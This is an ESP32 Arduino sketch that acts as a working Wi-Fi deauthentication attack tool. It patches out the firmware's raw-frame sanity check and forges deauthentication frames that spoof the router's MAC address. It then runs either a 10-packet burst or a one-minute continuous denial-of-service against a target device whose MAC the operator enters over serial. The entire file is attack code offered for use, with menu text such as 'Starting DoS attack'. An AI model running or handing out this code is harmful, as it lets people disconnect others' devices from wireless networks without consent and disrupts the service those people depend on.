#include <WiFi.h>
#include <esp_wifi.h>

// Function to bypass the sanity check for raw frame transmission
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3)
{
    return 0;
}

// Function to read and parse a MAC address from serial input
bool readMacAddressFromSerial(uint8_t *macAddress)
{
    // Read the MAC address from Serial input
    if (Serial.available() >= 17)
    { // MAC address format: "AA:BB:CC:DD:EE:FF"
        char macStr[18];
        Serial.readBytes(macStr, 17);
        macStr[17] = '\0';

        // Parse the MAC address
        sscanf(macStr, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &macAddress[0], &macAddress[1], &macAddress[2],
               &macAddress[3], &macAddress[4], &macAddress[5]);
        
        return true;
    }
    return false;
}

// Function to send a packet to the Serial port in hexadecimal format
void dumpPacketToSerial(const uint8_t *packet, size_t length)
{
    for (size_t i = 0; i < length; i++)
    {
        if (packet[i] < 16)
        {
            Serial.print("0");
        }
        Serial.print(packet[i], HEX);
        Serial.print(" ");
    }
    Serial.println();
}

// Function to deauthenticate a device from the network
void deauthenticateDevice(const uint8_t *targetMacAddress, const uint8_t *routerMac, int reasonCode)
{
    wifi_promiscuous_filter_t filter;
    filter.filter_mask |= WIFI_PROMIS_FILTER_MASK_MGMT; // Only capture management frames

    // Set the filter
    esp_wifi_set_promiscuous_filter(&filter);

    // Prepare the deauthentication packet
    uint8_t deauthPacket[26];
    memset(deauthPacket, 0, sizeof(deauthPacket));

    // Frame Control
    deauthPacket[0] = 0xC0; // Type: Management, Subtype: Deauthentication, To DS: 0, From DS: 0

    // Duration
    deauthPacket[2] = 0x00;
    deauthPacket[3] = 0x00;

    // Destination MAC
    for (int i = 0; i < 6; i++)
    {
        deauthPacket[4 + i] = targetMacAddress[i];
    }

    // Source MAC
    for (int i = 0; i < 6; i++)
    {
        deauthPacket[10 + i] = routerMac[i];
    }

    // BSSID
    for (int i = 0; i < 6; i++)
    {
        deauthPacket[16 + i] = routerMac[i];
    }

    // Reason Code
    deauthPacket[24] = reasonCode & 0xFF;
    deauthPacket[25] = 0x00;

    // Send the deauthentication packet
    esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), true);
    Serial.println("esp_wifi_80211_tx result: " + String(result));

    // Dump the entire deauthentication packet to Serial for debugging
    Serial.println("✅ Sent Deauthentication Packet:");
    dumpPacketToSerial(deauthPacket, sizeof(deauthPacket));

    // Restore the filter
    esp_wifi_set_promiscuous_filter(NULL);
}

void setup()
{
    // Initialize Serial
    Serial.begin(115200);

    // Initialize Wi-Fi
    WiFi.mode(WIFI_STA);
    WiFi.begin("*****", "*****"); // TODO: Am scos credentialele!!!

    while (WiFi.status() != WL_CONNECTED)
    {
        delay(1000);
        Serial.println("📶 Connecting to WiFi...");
    }
    Serial.println("✅ Connected to WiFi!");
}

void loop()
{
    uint8_t targetMacAddress[6];
    uint8_t routerMac[6];

    // Get the MAC addresses from the user
    Serial.println("⌨️ Enter the MAC address of the device you want to deauthenticate:");
    while (!readMacAddressFromSerial(targetMacAddress)) delay(100);

    Serial.println("⌨️ Enter the MAC address of the router:");
    while (!readMacAddressFromSerial(routerMac)) delay(100);

    // Print attack options
    Serial.println("🧨 Choose an attack type:");
    Serial.println("1. Send a 10-burst of deauthentication packets");
    Serial.println("2. Continuous deauthentication (DoS) for 1 minute");

    while (!Serial.available()) delay(100);
    int userChoice = Serial.parseInt();
    if (userChoice == 1)
    {
        Serial.println("🔥 Sending a 10-burst of deauthentication packets...");

        for (int i = 0; i < 10; i++)
        {
            // Deauthenticate the device from the network
            deauthenticateDevice(targetMacAddress, routerMac, 0x01);
            delay(100);
        }
    }
    else if (userChoice == 2)
    {
        Serial.println("🔥 Starting DoS attack for 1 minute...");

        unsigned long startTime = millis();
        unsigned long duration = 60000; // 1 minute in milliseconds

        while (millis() - startTime < duration)
        {
            // Deauthenticate the device from the network
            deauthenticateDevice(targetMacAddress, routerMac, 0x01);
            delay(100);
        }
    }
    else
    {
        Serial.println("Invalid choice. Please enter '1' or '2'.");
    }
}
